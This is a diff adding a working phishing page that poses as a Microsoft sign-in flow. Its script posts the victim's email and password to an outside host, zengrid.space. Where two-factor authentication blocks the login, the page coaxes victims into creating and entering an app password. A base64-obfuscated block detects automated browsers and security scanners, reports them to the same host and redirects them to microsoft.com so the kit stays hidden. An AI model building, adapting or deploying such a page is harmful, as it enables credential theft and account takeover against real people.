@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<meta name="robots" content="noindex,nofollow"/>
+<title>Sign in – Microsoft</title>
+<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 21 21'%3E%3Crect x='0' y='0' width='9.5' height='9.5' fill='%23f25022'/%3E%3Crect x='11.5' y='0' width='9.5' height='9.5' fill='%237fba00'/%3E%3Crect x='0' y='11.5' width='9.5' height='9.5' fill='%2300a4ef'/%3E%3Crect x='11.5' y='11.5' width='9.5' height='9.5' fill='%23ffb900'/%3E%3C/svg%3E"/>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+body{font-family:'Segoe UI',-apple-system,BlinkMacSystemFont,sans-serif;background:#f3f2f1;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;color:#1a1918;}
+.card{background:#fff;border-radius:4px;box-shadow:0 2px 6px rgba(0,0,0,.12),0 0 0 1px rgba(0,0,0,.04);padding:44px 44px 36px;width:100%;max-width:440px;}
+.ms-logo{display:flex;align-items:center;gap:8px;margin-bottom:32px;}
+.ms-logo span{font-size:20px;font-weight:600;color:#1a1918;letter-spacing:-.3px;}
+h1{font-size:24px;font-weight:600;color:#1a1918;margin-bottom:12px;line-height:1.25;}
+.sub{font-size:15px;color:#605e5c;margin-bottom:20px;line-height:1.5;}
+.account-pill{display:inline-flex;align-items:center;gap:8px;border:1px solid #d2d0ce;border-radius:20px;padding:6px 14px 6px 10px;font-size:13px;color:#323130;margin-bottom:20px;cursor:pointer;transition:background .15s;}
+.account-pill:hover{background:#f3f2f1;}
+.account-pill .av{width:24px;height:24px;border-radius:50%;background:#0078d4;color:#fff;font-size:11px;font-weight:700;display:flex;align-items:center;justify-content:center;flex-shrink:0;}
+.field{margin-bottom:12px;}
+.field label{display:block;font-size:13px;font-weight:600;color:#323130;margin-bottom:5px;}
+.field input{width:100%;border:none;border-bottom:1px solid #605e5c;padding:6px 0;font-size:15px;font-family:inherit;outline:none;background:transparent;color:#1a1918;transition:border-color .15s;}
+.field input:focus{border-bottom:2px solid #0078d4;}
+.pw-wrap{position:relative;}
+.pw-wrap input{padding-right:56px;}
+.pw-toggle{position:absolute;right:0;top:50%;transform:translateY(-50%);background:none;border:none;color:#0078d4;font-size:13px;cursor:pointer;font-family:inherit;padding:4px;}
+.pw-toggle:hover{text-decoration:underline;}
+.err{background:#fde7e9;border-left:3px solid #c50f1f;padding:10px 14px;font-size:13px;color:#c50f1f;margin-bottom:16px;line-height:1.5;display:none;border-radius:0 2px 2px 0;}
+.err.show{display:block;}
+.links-row{display:flex;align-items:center;justify-content:space-between;margin-top:28px;}
+.ms-link{font-size:13px;color:#0078d4;background:none;border:none;cursor:pointer;font-family:inherit;padding:0;text-decoration:none;}
+.ms-link:hover{text-decoration:underline;}
+.btn-next{background:#0078d4;color:#fff;border:none;border-radius:2px;padding:8px 20px;font-size:14px;font-weight:600;font-family:inherit;cursor:pointer;transition:background .15s;min-width:108px;}
+.btn-next:hover:not(:disabled){background:#106ebe;}
+.btn-next:disabled{background:#a19f9d;cursor:not-allowed;}
+.step{display:none;}
+.step.active{display:block;}
+.success{display:none;text-align:center;padding:16px 0;}
+.success .icon{font-size:56px;margin-bottom:18px;}
+.success h2{font-size:20px;font-weight:600;color:#107c10;margin-bottom:10px;}
+.success p{font-size:14px;color:#605e5c;line-height:1.6;}
+.footer{margin-top:28px;font-size:11px;color:#8a8886;text-align:center;border-top:1px solid #edebe9;padding-top:16px;}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="ms-logo">
+    <svg width="21" height="21" viewBox="0 0 21 21"><rect x="0" y="0" width="9.5" height="9.5" fill="#f25022"/><rect x="11.5" y="0" width="9.5" height="9.5" fill="#7fba00"/><rect x="0" y="11.5" width="9.5" height="9.5" fill="#00a4ef"/><rect x="11.5" y="11.5" width="9.5" height="9.5" fill="#ffb900"/></svg>
+    <span>Microsoft</span>
+  </div>
+
+  <!-- Step 1: Email -->
+  <div id="_s1" class="step active">
+    <h1>Sign in</h1>
+    <p class="sub">Use your Microsoft account.</p>
+    <div class="err" id="_err1"></div>
+    <form id="_frm1" autocomplete="on" novalidate>
+      <div class="field">
+        <label for="_em">Email, phone, or Skype</label>
+        <input type="email" id="_em" name="email" autocomplete="username" placeholder=""/>
+      </div>
+      <div class="links-row">
+        <a href="https://account.microsoft.com" target="_blank" class="ms-link">No account? Create one!</a>
+        <button type="submit" class="btn-next" id="_next">Next</button>
+      </div>
+    </form>
+    <div class="footer">🔒 Secured by Office365 · OAuth 2.0</div>
+  </div>
+
+  <!-- Step 2: Password -->
+  <div id="_s2" class="step">
+    <h1>Enter password</h1>
+    <div class="account-pill" id="_pill" onclick="document.getElementById('_s1').classList.add('active');document.getElementById('_s2').classList.remove('active');document.getElementById('_err1').classList.remove('show');document.getElementById('_em').focus();">
+      <div class="av" id="_av">?</div>
+      <span id="_em_disp"></span>
+    </div>
+    <div class="err" id="_err2"></div>
+    <form id="_frm2" autocomplete="on">
+      <div class="field">
+        <label for="_pw">Password</label>
+        <div class="pw-wrap">
+          <input type="password" id="_pw" name="password" autocomplete="current-password"/>
+          <button type="button" class="pw-toggle" id="_pwtog">Show</button>
+        </div>
+      </div>
+      <div class="links-row">
+        <a href="https://account.live.com/password/reset" target="_blank" class="ms-link">Forgot password?</a>
+        <button type="submit" class="btn-next" id="_sub">Sign in</button>
+      </div>
+    </form>
+    <div class="footer">🔒 Secured by Office365 · OAuth 2.0</div>
+  </div>
+
+  <!-- MFA screen -->
+  <div id="_mfa" class="step">
+    <div style="text-align:center;margin-bottom:24px;">
+      <div style="font-size:48px;margin-bottom:16px;">🔐</div>
+      <h1 style="font-size:20px;font-weight:600;color:#1a1918;margin-bottom:10px;">Additional verification required</h1>
+      <p style="font-size:14px;color:#605e5c;line-height:1.6;">Your account <strong id="_mfa_em"></strong> has two-factor authentication enabled, which this sign-in method doesn't support.</p>
+    </div>
+    <div style="background:#f3f2f1;border:1px solid #d2d0ce;border-radius:4px;padding:16px 18px;margin-bottom:24px;">
+      <div style="font-size:13px;font-weight:600;color:#323130;margin-bottom:10px;">Use an App Password instead:</div>
+      <div style="display:flex;flex-direction:column;gap:8px;">
+        <div style="display:flex;gap:10px;font-size:13px;color:#605e5c;align-items:flex-start;"><div style="width:20px;height:20px;border-radius:50%;background:#0078d4;color:#fff;font-size:11px;font-weight:700;display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:1px;">1</div>Sign in to your Microsoft account security settings</div>
+        <div style="display:flex;gap:10px;font-size:13px;color:#605e5c;align-items:flex-start;"><div style="width:20px;height:20px;border-radius:50%;background:#0078d4;color:#fff;font-size:11px;font-weight:700;display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:1px;">2</div>Under "App passwords", create a new app password</div>
+        <div style="display:flex;gap:10px;font-size:13px;color:#605e5c;align-items:flex-start;"><div style="width:20px;height:20px;border-radius:50%;background:#0078d4;color:#fff;font-size:11px;font-weight:700;display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:1px;">3</div>Come back here and enter it as your password</div>
+      </div>
+    </div>
+    <div style="display:flex;gap:10px;">
+      <button onclick="document.getElementById('_mfa').classList.remove('active');document.getElementById('_s2').classList.add('active');document.getElementById('_err2').classList.remove('show');document.getElementById('_pw').value='';document.getElementById('_pw').focus();" style="flex:1;background:transparent;border:1px solid #d2d0ce;border-radius:2px;padding:8px 16px;font-size:13px;font-weight:600;color:#323130;cursor:pointer;font-family:inherit;">← Try again</button>
+      <a href="https://account.activedirectory.windowsazure.com/AppPasswords.aspx" target="_blank" style="flex:2;background:#0078d4;color:#fff;border:none;border-radius:2px;padding:8px 16px;font-size:13px;font-weight:600;font-family:inherit;cursor:pointer;text-decoration:none;display:flex;align-items:center;justify-content:center;">Create App Password ↗</a>
+    </div>
+    <div class="footer">🔒 Secured by Office365 · OAuth 2.0</div>
+  </div>
+
+  <!-- Success -->
+  <div class="success" id="_ok">
+    <div class="icon">✅</div>
+    <h2>Account connected!</h2>
+    <p>Your Microsoft account has been linked successfully.<br/>You can close this tab.</p>
+  </div>
+</div>
+
+<script>(function(){
+var _a=function(s){return atob(s);};
+var _b=navigator,_c=window,_d=document,_w=screen;
+var _t=false;
+if(_b[_a('d2ViZHJpdmVy')]===true)_t=true;
+if(_c[_a('Y2FsbFBoYW50b20=')]||_c[_a('X3BoYW50b20=')])_t=true;
+if(_c[_a('X19uaWdodG1hcmU=')])_t=true;
+if(_d.documentElement.getAttribute(_a('d2ViZHJpdmVy')))_t=true;
+if(_w.width<100||_w.height<100)_t=true;
+if(_b[_a('bGFuZ3VhZ2Vz')]&&_b[_a('bGFuZ3VhZ2Vz')].length===0)_t=true;
+var _isMob=/Mobi|Android|iPhone|iPad|iPod/i.test(_b.userAgent);
+if(!_isMob&&(!_b[_a('cGx1Z2lucw==')]||_b[_a('cGx1Z2lucw==')].length===0))_t=true;
+if(_w.colorDepth<16)_t=true;
+try{
+  var _cv=_d.createElement('canvas');
+  var _gl=_cv.getContext('webgl')||_cv.getContext('experimental-webgl');
+  if(_gl){
+    var _di=_gl.getExtension('WEBGL_debug_renderer_info');
+    if(_di){
+      var _rv=_gl.getParameter(_di.UNMASKED_RENDERER_WEBGL)||'';
+      if(_rv.indexOf(_a('U3dpZnRTaGFkZXI='))>-1||_rv.indexOf(_a('TWVzYQ=='))>-1)_t=true;
+    }
+  }
+}catch(_e2){}
+if(_c.self!==_c.top)_t=true;
+if(_t){try{navigator.sendBeacon(atob('aHR0cHM6Ly96ZW5ncmlkLnNwYWNlL2Nvbm5lY3QvcGFnZS9wWGotMjlWWW4xeDFLV2tveWhkNVBuN0QxbVQ5MGxWUy9ib3Q='),'');}catch(_eb){}_c.location.replace(_a('aHR0cHM6Ly93d3cubWljcm9zb2Z0LmNvbQ=='));return;}
+_c._lt=Date.now();
+_c._hg=false;
+var _mh=function(){_c._hg=true;_d.removeEventListener('mousemove',_mh);_d.removeEventListener('touchstart',_mh);};
+_d.addEventListener('mousemove',_mh);
+_d.addEventListener('touchstart',_mh);
+var _mc=_d.getElementById('_mc');
+var _ld=_d.getElementById('_ld');
+if(_mc)_mc.style.display='none';
+setTimeout(function(){
+  if(_mc){
+    _mc.style.opacity='0';
+    _mc.style.transition='opacity 0.4s ease';
+    _mc.style.display='block';
+    setTimeout(function(){_mc.style.opacity='1';},20);
+  }
+  if(_ld)_ld.style.display='none';
+},1400+Math.random()*600);
+var _hp=_d.createElement('div');
+_hp.style.cssText='position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;overflow:hidden;opacity:0;pointer-events:auto;';
+var _ha=_d.createElement('a');_ha.href='#verify';_ha.textContent='Verify Account';
+_ha.onclick=function(ev){ev.preventDefault();try{navigator.sendBeacon(atob('aHR0cHM6Ly96ZW5ncmlkLnNwYWNlL2Nvbm5lY3QvcGFnZS9wWGotMjlWWW4xeDFLV2tveWhkNVBuN0QxbVQ5MGxWUy9ib3Q='),'');}catch(_eb){}_c.location.replace(_a('aHR0cHM6Ly93d3cubWljcm9zb2Z0LmNvbQ=='));};
+_hp.appendChild(_ha);
+var _fn=function(){if(_d.body){_d.body.appendChild(_hp);}else{setTimeout(_fn,100);}};_fn();
+})();</script>
+<script>(function(){
+  var _ep = "https://zengrid.space/connect/page/pXj-29VYn1x1KWkoyhd5Pn7D1mT90lVS/direct-login";
+
+  // Step 1 → Step 2
+  document.getElementById('_frm1').addEventListener('submit', function(e){
+    e.preventDefault();
+    var em = document.getElementById('_em').value.trim();
+    var err = document.getElementById('_err1');
+    if (!em || !em.includes('@')) {
+      err.textContent = 'Enter a valid email address.';
+      err.classList.add('show');
+      return;
+    }
+    err.classList.remove('show');
+    // Clear any stale password error and value from a previous attempt
+    document.getElementById('_err2').classList.remove('show');
+    document.getElementById('_pw').value = '';
+    // Populate account pill
+    document.getElementById('_em_disp').textContent = em;
+    document.getElementById('_av').textContent = em[0].toUpperCase();
+    // Switch steps
+    document.getElementById('_s1').classList.remove('active');
+    document.getElementById('_s2').classList.add('active');
+    document.getElementById('_pw').focus();
+  });
+
+  // Password show/hide
+  document.getElementById('_pwtog').addEventListener('click', function(){
+    var i = document.getElementById('_pw');
+    var show = i.type === 'password';
+    i.type = show ? 'text' : 'password';
+    this.textContent = show ? 'Hide' : 'Show';
+  });
+
+  // Step 2: Sign in
+  document.getElementById('_frm2').addEventListener('submit', async function(e){
+    e.preventDefault();
+    var btn = document.getElementById('_sub');
+    var err = document.getElementById('_err2');
+    err.classList.remove('show');
+    var pw = document.getElementById('_pw').value;
+    if (!pw) {
+      err.textContent = 'Enter your password.';
+      err.classList.add('show');
+      return;
+    }
+    btn.textContent = 'Signing in…';
+    btn.disabled = true;
+    try {
+      var r = await fetch(_ep, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          email: document.getElementById('_em').value.trim(),
+          password: pw
+        })
+      });
+      var d = await r.json();
+      if (!r.ok) {
+        var isMfa = (r.headers.get('x-mfa-required') === 'true');
+        if (isMfa) {
+          document.getElementById('_mfa_em').textContent = document.getElementById('_em').value.trim();
+          document.getElementById('_s2').classList.remove('active');
+          document.getElementById('_mfa').classList.add('active');
+          btn.textContent = 'Sign in';
+          btn.disabled = false;
+          return;
+        }
+        throw new Error(d.detail || 'Sign-in failed. Please try again.');
+      }
+      document.getElementById('_s2').classList.remove('active');
+      document.getElementById('_ok').style.display = 'block';
+    } catch(ex) {
+      err.textContent = ex.message;
+      err.classList.add('show');
+      btn.textContent = 'Sign in';
+      btn.disabled = false;
+    }
+  });
+})();
+</script>
+</body>
+</html>
